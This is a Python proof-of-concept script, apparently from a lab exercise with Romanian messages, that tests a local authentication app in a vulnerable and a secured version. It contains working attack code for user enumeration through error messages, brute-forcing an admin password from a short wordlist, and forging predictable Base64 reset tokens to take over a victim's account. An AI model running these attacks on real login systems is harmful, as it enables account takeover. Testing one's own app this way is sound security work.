import requests
import base64

BASE_URL = "http://127.0.0.1:8000"

def test_user_enumeration(email):
    print(f"\n[*] Testing Enumeration for {email}...")
    try:
        r = requests.post(f"{BASE_URL}/login", json={"email": email, "password": "wrongpassword123!"})
        if "Parolă greșită" in r.text or "User inexistent" in r.text:
            print(f"[!!!] VULNERABIL (v1): Am aflat exact motivul (User Enumeration posibil) -> {r.json()['detail']}")
        elif r.status_code == 401 and "Invalid credentials" in r.text:
            print(f"[+] SECURIZAT (v2): Serverul a ascuns motivul real -> {r.json()['detail']}")
        else:
            print(f"[-] Răspuns necunoscut: {r.text}")
    except Exception as e:
        print(f"Eroare conexiune: {e}")

def test_brute_force(email, wordlist):
    print(f"\n[*] Starting Brute Force against {email}...")
    for pwd in wordlist:
        try:
            r = requests.post(f"{BASE_URL}/login", json={"email": email, "password": pwd})
            if r.status_code == 200:
                print(f"[!!!] VULNERABIL (v1): Am ghicit parola! Parola este: {pwd}")
                return
            elif r.status_code == 401 and "Cont blocat" in r.text:
                print(f"[+] SECURIZAT (v2): Serverul m-a blocat după prea multe încercări! (Parola blocată la: {pwd})")
                return
        except Exception as e:
             print(f"Eroare: {e}")
             return
    print("[-] Brute force terminat. Nu s-a declanșat nicio protecție, dar parola nu a fost găsită (contul probabil nu există).")

def test_predictable_token(email):
    print(f"\n[*] Testing Reset Token predictability for {email}...")
    
    # 1. Declanșăm procesul de resetare pentru a popula baza de date
    requests.post(f"{BASE_URL}/request-reset", json={"email": email})
    
    # 2. Hackerul calculează tokenul presupunând că e doar Base64 (ca în v1)
    fake_token = base64.urlsafe_b64encode(email.encode('utf-8')).decode('utf-8').rstrip('=')
    print(f"    -> Hackerul încearcă tokenul ghicit: {fake_token}")
    
    # 3. Hackerul încearcă să reseteze parola
    try:
        r = requests.post(f"{BASE_URL}/reset-password", json={"token": fake_token, "new_password": "HackedPassword123!"})
        if r.status_code == 200:
            print("[!!!] VULNERABIL (v1): Serverul a acceptat tokenul Base64! Contul a fost furat!")
        elif r.status_code == 400 and "Token invalid" in r.text:
            print("[+] SECURIZAT (v2): Serverul a RESPINS tokenul Base64 (folosește tokenuri sigure)!")
        else:
            print(f"[-] Răspuns necunoscut: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"Eroare: {e}")

if __name__ == "__main__":
    print("=== Rulează acest PoC împotriva aplicației ===")
    
    # Creează contul țintă (admin) pentru a putea testa cu succes brute force
    requests.post(f"{BASE_URL}/register", json={"email": "admin@authx.local", "password": "password"})
    
    test_user_enumeration("inexistent@authx.local")
    
    passwords = ["123456", "12345678", "admin", "authx123", "parola1", "password"]
    test_brute_force("admin@authx.local", passwords)
    
    # Înregistrăm și victima pentru testul de token
    requests.post(f"{BASE_URL}/register", json={"email": "victim@authx.local", "password": "password"})
    test_predictable_token("victim@authx.local")
